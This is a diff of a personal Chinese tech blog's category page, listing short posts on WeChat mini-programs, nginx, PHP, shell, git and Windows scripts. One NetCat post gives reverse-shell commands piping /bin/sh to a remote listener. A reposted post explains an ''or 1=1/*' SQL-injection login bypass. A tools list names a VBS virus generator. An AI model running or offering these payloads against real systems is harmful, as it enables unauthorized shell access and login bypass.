@@ -4,7 +4,7 @@
 	<meta charset="utf-8">
 	<title>  
 	  
-  	sc命令 - shengsheng的博客
+  	测试 - shengsheng的博客
   	
 	</title>
 
@@ -114,10 +114,732 @@
 		</div>	
 		<div class="mid-col">
 			<div class="mid-col-container"> <div id="content" class="inner">
+<div itemscope itemtype="http://schema.org/Blog">
 
-	<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-		<h1 class="title" itemprop="name">sc命令</h1>
+
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2017-04-05T02:57:42+08:00" itemprop="datePublished">2017/04/05</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578629495.html" itemprop="url">
+		小玩微信小程序</a></h1>
 		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2017-04-05 14:54</p>
+
+<p>上周玩了两三晚微信小程序，开发了一个简单事例：</p>
+
+<p>官方文档：<a href="https://mp.weixin.qq.com/debug/wxadoc/dev/index.html?t=2017327">https://mp.weixin.qq.com/debug/wxadoc/dev/index.html?t=2017327</a></p>
+
+<p>首先当然是注册一个小程序的号，然后下载个小程序微信开发。</p>
+
+<p>小程序里面提供了一套mvc的架构，按照架构就可以开发了，很容易理解。</p>
+
+<p>值得注意的是页面是使用html+css..但js未必是jquery的，里面提供了一套api.</p>
+
+<p>例如发起请求：wx.request(OBJECT)<br/>
+<pre><code class="lang-javascript">wx.request({<br/>
+  url: <span class="hljs-string">&#39;test.php&#39;</span>, <span class="hljs-comment">//仅为示例，并非真实的接口地址</span><br/>
+  data: {<br/>
+     x: <span class="hljs-string">&#39;&#39;</span> ,<br/>
+     y: <span class="hljs-string">&#39;&#39;</span><br/>
+  },<br/>
+  header: {<br/>
+      <span class="hljs-string">&#39;content-type&#39;</span>: <span class="hljs-string">&#39;application/json&#39;</span><br/>
+  },<br/>
+  success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>) </span>{<br/>
+    <span class="hljs-built_in">console</span>.log(res.data)<br/>
+  }<br/>
+})<br/>
+</code></pre><br/>
+但和服务端通通一定要使用https,这里硬规定，现在的app很多都走https了，更安全吧。</p>
+
+<p>使用https,避免明文被窃听。</p>
+
+<p>申请好https之后，如果是nginx,加多一个server即可， 不影响之前的配置。</p>
+
+<p>server {<br/>
+listen 443;<br/>
+server_name <a href="http://www.anyway.cn">www.anyway.cn</a>;</p>
+
+<p>//https开启<br/>
+ssl on;<br/>
+ssl_certificate /ddd/cert/1_<a href="http://www.anyway.cn_bundle.crt">www.anyway.cn_bundle.crt</a>;<br/>
+ssl_certificate_key /ddd/cert/2_<a href="http://www.anyway.cn.key">www.anyway.cn.key</a>;<br/>
+ssl_session_timeout 5m;<br/>
+ssl_protocols TLSv1 TLSv1.1 TLSv1.2;<br/>
+ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;<br/>
+ssl_prefer_server_ciphers on;</p>
+
+<p>}</p>
+
+<p>审核大概两天的时间就差不多了，但是提交的版本，你发了最新版本，也只能按提交时候的版本来审核。</p>
+
+<p>现在看了一下统计，每也也有一些用户递增，那就足够了，有兴趣，可以添加『手机归属地』体验一下。</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2017-01-21T02:20:42+08:00" itemprop="datePublished">2017/01/21</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578629750.html" itemprop="url">
+		博客暂停访问原因</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2017-01-21 02:20</p>
+
+<p>最近被攻击，导致停机几天，主要wordpress的xmlrpc.php被一直访问。</p>
+
+<p>一早以为是腾讯云坑了。具体排查了一下，发现是php-fpm进程卡住了。</p>
+
+<p>[21-Jan-2017 08:27:39] [pool www] pid 5966<br/>
+script_filename = /data/wwwroot/default/xmlrpc.php<br/>
+[0x00007efddb412c20] curl_exec() /data/wwwroot/default/wp-includes/Requests/Transport/cURL.php:162<br/>
+[0x00007efddb412b50] request() /data/wwwroot/default/wp-includes/class-requests.php:379<br/>
+[0x00007efddb412a40] request() /data/wwwroot/default/wp-includes/class-http.php:365<br/>
+[0x00007efddb4128a0] request() /data/wwwroot/default/wp-includes/class-http.php:590<br/>
+[0x00007efddb4127e0] get() /data/wwwroot/default/wp-includes/http.php:70<br/>
+[0x00007efddb412730] wp_safe_remote_get() /data/wwwroot/default/wp-includes/class-wp-xmlrpc-server.php:6303<br/>
+[0x00007efddb412480] pingback_ping() /data/wwwroot/default/wp-includes/IXR/class-IXR-server.php:115<br/>
+[0x00007efddb4123a0] call() /data/wwwroot/default/wp-includes/IXR/class-IXR-server.php:65<br/>
+[0x00007efddb4122b0] serve() /data/wwwroot/default/wp-includes/IXR/class-IXR-server.php:27<br/>
+[0x00007efddb412210] __construct() /data/wwwroot/default/wp-includes/IXR/class-IXR-server.php:35<br/>
+[0x00007efddb412170] IXR_Server() /data/wwwroot/default/wp-includes/class-wp-xmlrpc-server.php:206<br/>
+[0x00007efddb412100] serve_request() /data/wwwroot/default/xmlrpc.php:84</p>
+
+<p>自己暴网站文件地址真的好么？哈哈。。。。</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-01-21T10:57:43+08:00" itemprop="datePublished">2016/01/21</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578630162.html" itemprop="url">
+		mac下设置内置键盘失效</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2016-01-21 08:54</p>
+
+<p>使用hhkb，想禁用内置键盘</p>
+
+<p>辅助与设置-》启用鼠标键-》设置连按5下option启用即可</p>
+
+<p>不过delte键和f1那些是不禁用的。</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2015-11-06T10:57:43+08:00" itemprop="datePublished">2015/11/06</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578630972.html" itemprop="url">
+		hhkb体验</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2015-11-06 09:58</p>
+
+<p>hhkb跳线相关<br/>
+011001</p>
+
+<p>开启mac模式，6是多媒体相关</p>
+
+<p>锁屏<br/>
+fn + ctrl + shift + esc</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2015-09-01T10:57:43+08:00" itemprop="datePublished">2015/09/01</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578632450.html" itemprop="url">
+		mac dash</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2015-09-01 08:34</p>
+
+<p>最近买了款软件dash..</p>
+
+<p>内置购买用了128.。</p>
+
+<p>感觉体验不错。查询十分方便。</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2015-08-18T10:57:43+08:00" itemprop="datePublished">2015/08/18</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578634347.html" itemprop="url">
+		NetCat笔记</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2015-08-18 21:38</p>
+
+<p>老实说黑客技术，不宜研究太深。但有机会将黑客技术用于正途，还是一件大好事。正所谓技术没有正邪，只是看使用的人。<br/>
+另外反向穿透太强大了。</p>
+
+<p>开启反向代理，需要修改netcat原代码，并进行重新编译。<br/>
+修改netcat.c<br/>
+如何想编译出 -e 和 -t 选项， 只要加上两条define 语句即可。</p>
+
+<h1 id="toc_0">define GAPING_SECURITY_HOLE</h1>
+
+<h1 id="toc_1">define TELNET</h1>
+
+<p>使用反向代理：</p>
+
+<p>输入输出分开<br/>
+服务端<br/>
+./netcat -vv -l -p 1221<br/>
+./netcat -vv -l -p 1222<br/>
+客户端<br/>
+./netcat 192.168.1.101 1221 | /bin/sh |nc 192.168.1.101 1222</p>
+
+<p>输入输出相同<br/>
+服务端<br/>
+./netcat -vv -l -p 1222<br/>
+客户端<br/>
+./netcat -e /bin/sh 192.168.1.101 1222</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2015-03-31T10:57:44+08:00" itemprop="datePublished">2015/03/31</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578643918.html" itemprop="url">
+		setcookie无效</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2015-03-31 11:10</p>
+
+<p>注意第三个参数，不能直接写秒数，要time()+秒数</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2015-03-23T10:57:44+08:00" itemprop="datePublished">2015/03/23</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578644186.html" itemprop="url">
+		vim学习网站</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2015-03-23 22:14</p>
+
+<p>发现不错的vim学习网站：<br/>
+vimcasts.org<br/>
+<a href="http://vimcasts.org/episodes/the-file-explorer/">http://vimcasts.org/episodes/the-file-explorer/</a></p>
+
+<p><a href="https://github.com/showx/dotfiles">https://github.com/showx/dotfiles</a></p>
+
+<p><a href="https://github.com/nelstrom/vim-qargs">https://github.com/nelstrom/vim-qargs</a></p>
+
+<p><a href="https://github.com/tpope/vim-abolish">https://github.com/tpope/vim-abolish</a></p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2014-12-09T10:57:45+08:00" itemprop="datePublished">2014/12/09</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578651554.html" itemprop="url">
+		测试时候动态访问模式</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2014-12-09 13:38</p>
+
+<p>有时候项目老是生成html，需要测试又要生成，太麻烦了。加上。</p>
+
+<p>项目需要动态访问，静态文件也是。 使用nginx在到这个效果。</p>
+
+<h1 id="toc_0">!-e $request_filename -x是否可执行</h1>
+
+<p>if (\(request_filename ~* (.*).html) {<br/>
+rewrite ^(.*)\) /route.php?rewrite_path=$1 break;<br/>
+}</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2014-12-03T10:57:45+08:00" itemprop="datePublished">2014/12/03</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578652391.html" itemprop="url">
+		shell 学习笔记</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2014-12-03 22:47</p>
+
+<p>($?) 为0的退出码</p>
+
+<p>检查文件是否排序过<br/>
+＃!/bin/bash<br/>
+sort -C filename;<br/>
+if [ $? -eq 0]; then<br/>
+   echo Sort;<br/>
+else<br/>
+   echo nosort;<br/>
+fi</p>
+
+<p>file_jpg = &quot;sample.jpg&quot;<br/>
+name=\({file_jpg%.*}   # %.* 是从左到右 %%.*从右向左 #*.}从右到左  ##*.<br/>
+echo \)name #sample</p>
+
+<p>-print 输出 </p>
+
+<p>xargs </p>
+
+<p>sort</p>
+
+<p>uniq</p>
+
+<p>find -type f -name &quot;*.mp3&quot; </p>
+
+<p>-exe {}<br/>
+{}代表匹配的</p>
+
+<p>aspell拼写检查</p>
+
+<p>md5sum加密系列</p>
+
+<p>spawn 指定需要自动化哪一个命令<br/>
+expect 等待的消息<br/>
+send 发送的消息<br/>
+expect eof 交互结束</p>
+
+<p>split 分割文件<br/>
+csplit</p>
+
+<p>tr 替换</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2014-07-22T10:57:45+08:00" itemprop="datePublished">2014/07/22</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578657672.html" itemprop="url">
+		php缩小png图片不损失透明色的解决方法</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2014-07-22 14:57</p>
+
+<p>png图片如果带了透明色按照jpg的方式来缩小，就会造成透明色损失。那么如何处理才能保存透明色呢？下面的代码就可以解决这个问题</p>
+
+<p>主要是利用gd库的两个方法：<br/>
+复制代码 代码如下:</p>
+
+<p>imagecolorallocatealpha //分配颜色 + alpha<br/>
+imagesavealpha //设置在保存 png 图像时保存完整的 alpha 通道信息<br/>
+代码示例：<br/>
+复制代码 代码如下:</p>
+
+<p>//获取源图gd图像标识符<br/>
+\(srcImg = imagecreatefrompng(&#39;./src.png&#39;);<br/>
+\)srcWidth = imagesx(\(srcImg);<br/>
+\)srcHeight = imagesy(\(srcImg);<br/>
+//创建新图<br/>
+\)newWidth = round(\(srcWidth / 2);<br/>
+\)newHeight = round(\(srcHeight / 2);<br/>
+\)newImg = imagecreatetruecolor(\(newWidth, \)newHeight);<br/>
+//分配颜色 + alpha，将颜色填充到新图上<br/>
+\(alpha = imagecolorallocatealpha(\)newImg, 0, 0, 0, 127);<br/>
+imagefill(\(newImg, 0, 0, \)alpha);<br/>
+//将源图拷贝到新图上，并设置在保存 PNG 图像时保存完整的 alpha 通道信息<br/>
+imagecopyresampled(\(newImg, \)srcImg, 0, 0, 0, 0, \(newWidth, \)newHeight, \(srcWidth, \)srcHeight);<br/>
+imagesavealpha(\(newImg, true);<br/>
+imagepng(\)newImg, &#39;./dst.png&#39;);</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2013-12-25T02:20:49+08:00" itemprop="datePublished">2013/12/25</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578660018.html" itemprop="url">
+		Git中从远程的分支获取最新的版本到本地有这样2个命令：</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<ol>
+<li>git fetch：相当于是从远程获取最新版本到本地，不会自动merge</li>
+</ol>
+
+<p>git fetch origin master<br/>
+git log -p master..origin/master<br/>
+git merge origin/master</p>
+
+<pre><code class="language-text">以上命令的含义：
+</code></pre>
+
+<p>首先从远程的origin的master主分支下载最新的版本到origin/master分支上<br/>
+   然后比较本地的master分支和origin/master分支的差别<br/>
+   最后进行合并<br/>
+   上述过程其实可以用以下更清晰的方式来进行：<br/>
+ git fetch origin master:tmp<br/>
+git diff tmp <br/>
+git merge tmp</p>
+
+<pre><code class="language-text">从远程获取最新的版本到本地的test分支上
+</code></pre>
+
+<p>之后再进行比较合并</p>
+
+<ol>
+<li>git pull：相当于是从远程获取最新版本并merge到本地<br/>
+git pull origin master</li>
+</ol>
+
+<p>上述命令其实相当于git fetch 和 git merge<br/>
+在实际使用中，git fetch更安全一些<br/>
+因为在merge前，我们可以查看更新情况，然后再决定是否合并<br/>
+结束</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2010-02-06T10:57:46+08:00" itemprop="datePublished">2010/02/06</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578667250.html" itemprop="url">
+		excel2000自带3D赛车游戏</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2010-11-27 12:47</p>
+
+<p>excel2000自带3D赛车游戏</p>
+
+<p>打开空白》新建》另存WEB页》发布》添加交互对象》在2000行WC列选中按</p>
+
+<p>shift|ctrl|alt同时击excel office logo</p>
+
+<p>方向键    空格开火   H开车灯    O放油烟</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2010-02-06T10:57:46+08:00" itemprop="datePublished">2010/02/06</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578667504.html" itemprop="url">
+		两个Windows下自动切换IP小脚本</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2010-11-17 05:01</p>
+
+<p>从办公到家庭环境，或者从会议室到办公工位上的IP切换相信已经把你搞的烦死了，那么用下面的2个小脚本吧，呵呵，药到病除。　　 </p>
+
+<p>　　1. 切换成自动获取IP 　　 </p>
+
+<p>　　@echo off　　 </p>
+
+<p>　　netsh interface ip set address name=&quot;local&quot; source=dhcp　　 </p>
+
+<p>　　netsh interface ip set dns name=&quot;local&quot; source=dhcp　　 </p>
+
+<p>　　2. 切换成固定IP 　　 </p>
+
+<p>　　@echo off　　 </p>
+
+<p>　　netsh interface ip set address local static 192.168.0.84 255.255.255.0 192.168.0.254 </p>
+
+<p>　　netsh interface ip set dns local 192.168.0.254　　 </p>
+
+<p>　　netsh interface ip add dns local 202.106.196.115 index=2　　 </p>
+
+<p>　　netsh interface ip add dns local 202.106.0.20 index=3　　 </p>
+
+<p>　　&quot;local&quot; 是你的本地网卡名称，也可能是 &quot;本地连接&quot;，需要自己替换下。如果是2个固定IP间的来回切换，把第2个脚本自己改改吧 :)　　 </p>
+
+<p>　　dns设置中，第一个是set，表示设置，后面两个则是添加，自己替换成当地的dns server。</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2010-02-06T10:57:46+08:00" itemprop="datePublished">2010/02/06</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578667793.html" itemprop="url">
+		hk工具</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2010-07-19 13:59</p>
+
+<p>MBSA软件检测系统安全</p>
+
+<p>ProtectX扫描器的追踪</p>
+
+<p>Sniffer PortectX</p>
+
+<p>WebDAVScan</p>
+
+<p>Iris</p>
+
+<p>SpyNet sniffer(capture net)</p>
+
+<p>搏获网页内容“艾菲网页侦探”</p>
+
+<p>WebCracker</p>
+
+<p>QuickFyre</p>
+
+<p>Kaboom</p>
+
+<p>VBS脚本病毒生成器</p>
+
+<p>NTLM</p>
+
+<p>MIME</p>
+
+<p>SyGate</p>
+
+<p>间谍、广告的杀手?? AD-aware</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2010-02-06T10:57:46+08:00" itemprop="datePublished">2010/02/06</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578668135.html" itemprop="url">
+		php万能密码</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>date: 2010-05-19 14:55</p>
+
+<p>如果一个网站的前台都是注入漏洞，那么凭经验，万能密码进后台的几率基本上百分之百。可是有的人说对PHP的站如果是GPC魔术转换开启，就会对特殊符号转义，就彻底杜绝了PHP注入。其实说这话的人没有好好想过，更没有尝试过用万能密码进PHP的后台。其实GPC魔术转换是否开启对用万能密码进后台一点影响也没有。</p>
+
+<pre><code class="language-text">    如果你用这样的万能密码‘or&#39;=&#39;or’，当然进不去，理由是GPC开启的时候单引号会被转换。
+
+    PHP注入时我常用的万能密码是：‘or 1=1/*.
+
+    那我们分析一下为什么这可以进后台。
+
+    如果sql语句这样写：“SELECT * FROM admin where name=’”.$_POST[&#39;name&#39;].“‘andpassword=’”.$_POST[&#39;password&#39;].“‘”,那我们在帐号处输入万能密码&#39;or 1=1/*，密码随便输，sql语句就成了select * from admin where name=&#39;&#39;or 1=1/*&#39; and password=’任意字符‘。
+
+    /*为mysql的注释符，这样后面的东西就都被注释掉了，也就是为什么密码随便输的原因。假设GPC转换没有开启，那么请看：where name=&#39;&#39;or 1=1（*/后面的东西被注释掉了），name=&#39;’的逻辑值为假，而后面的1=1逻辑值则为真，对于整体就成了假 or 真，最终的逻辑值还是真，就进后台了。
+
+    那么如果GPC转换开启了，就对单引号进行了转换。语句就变成了where name=&#39;\&#39;or 1=1,再看一下和刚才有什么区别，无非是多了个\。name=&#39;\‘与name=&#39;’的逻辑值一样，都为假，那1=1为真，总的sql语句的逻辑值不还是真吗？那有进不去后台的理由吗？
+
+    所以总的来说，php网站的万能密码可以这样写：‘or 1=1/*，而GPC转换是否开启对它没有任何影响！
+
+    所以请改变你的想法：存在字符型注入的php网站是可以用万能密码&#39;or 1=1/*的
+</code></pre>
+
+<p>转自飞飞</p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2010-02-06T10:57:46+08:00" itemprop="datePublished">2010/02/06</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='test.html'>测试</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15809578668268.html" itemprop="url">
+		sc命令</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
 			<p>date: 2010-05-12 13:29</p>
 
 <p>SC命令功能<br/>
@@ -554,17 +1276,27 @@
 　　下面的示例显示了如何使用 sc stop 命令：<br/>
 　　sc stop tapisrv</p>
 
+
+			
+			
 		</div>
+
 	</article>
-	<div class="share-comment">
+  
+
+</div>
+<nav id="pagenavi">
 	 
+	
+	<div class="center"><a href="archives.html">Blog Archives</a></div>
 
-	  
+</nav>
 
-	  
+</div>
 
-	</div>
-</div>        </div>
+
+
+        </div>
 			<footer id="footer" class="inner">Copyright &copy; 2014
 Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a> &nbsp;&nbsp; 
 Theme by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
